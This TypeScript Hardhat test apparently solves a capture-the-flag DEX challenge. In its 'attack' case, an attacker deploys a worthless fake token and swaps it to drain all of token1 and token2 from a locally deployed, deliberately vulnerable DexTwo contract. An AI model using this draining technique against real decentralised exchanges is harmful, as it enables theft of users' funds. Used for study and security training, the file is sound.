import { SignerWithAddress } from '@nomiclabs/hardhat-ethers/signers';
import { expect } from 'chai';
import { Contract } from 'ethers';
import { ethers } from 'hardhat';

const { provider, utils } = ethers;

describe('Dex2', () => {
  let owner: SignerWithAddress;
  let attacker: SignerWithAddress;
  let token1: Contract;
  let token2: Contract;
  let dex: Contract;
  before(async () => {
    [owner, attacker] = await ethers.getSigners();

    // Create Dex
    const [TokenFactory, DexFactory] = await Promise.all([
      ethers.getContractFactory('SwappableTokenTwo'),
      ethers.getContractFactory('DexTwo'),
    ]);

    dex = await DexFactory.connect(owner).deploy();
    await dex.deployed;

    // Create tokens with initial supply
    [token1, token2] = await Promise.all([
      TokenFactory.connect(owner).deploy(
        dex.address,
        'Token1',
        'TK1',
        utils.parseEther('110')
      ),
      TokenFactory.connect(owner).deploy(
        dex.address,
        'Token2',
        'TK2',
        utils.parseEther('110')
      ),
    ]);

    await Promise.all([token1.deployed(), token2.deployed()]);

    // Register tokens on Dex
    const tx = await dex
      .connect(owner)
      .setTokens(token1.address, token2.address);
    await tx.wait();

    // Send 10 tokens to attacker and 100 tokens to dex
    const [tx1, tx2, tx3, tx4] = await Promise.all([
      token1.connect(owner).transfer(attacker.address, utils.parseEther('10')),
      token2.connect(owner).transfer(attacker.address, utils.parseEther('10')),
      token1.connect(owner).transfer(dex.address, utils.parseEther('100')),
      token2.connect(owner).transfer(dex.address, utils.parseEther('100')),
    ]);

    await Promise.all([tx1.wait(), tx2.wait(), tx3.wait(), tx4.wait()]);
  });

  it('attack', async () => {
    const FakeTokenFactory = await ethers.getContractFactory(
      'FakeSwappableTokenTwo'
    );

    const INITIAL_SUPPLY = utils.parseEther('1000000');
    const fakeToken = await FakeTokenFactory.connect(attacker).deploy(
      'FakeToken',
      'FTK',
      INITIAL_SUPPLY
    );
    await fakeToken.deployed();

    let tx;
    tx = await fakeToken.connect(attacker).approve(dex.address, INITIAL_SUPPLY);
    await tx.wait();

    tx = await dex
      .connect(attacker)
      .approve(dex.address, utils.parseEther('10'));
    await tx.wait();

    // SEND TOKENS TO DEX
    tx = await fakeToken
      .connect(attacker)
      .transfer(dex.address, utils.parseEther('1'));
    await tx.wait();

    // GET ALL OF TOKEN1 BALANCE
    tx = await dex
      .connect(attacker)
      .swap(fakeToken.address, token1.address, utils.parseEther('1'));
    await tx.wait();

    // GET ALL OF TOKEN2 BALANCE
    tx = await dex
      .connect(attacker)
      .swap(fakeToken.address, token2.address, utils.parseEther('2'));
    await tx.wait();

    const [dexToken1Balance, dexToken2Balance] = await Promise.all([
      token1.balanceOf(dex.address),
      token2.balanceOf(dex.address),
    ]);

    expect(dexToken1Balance.eq(0) && dexToken2Balance.eq(0)).to.be.true;
  });
});
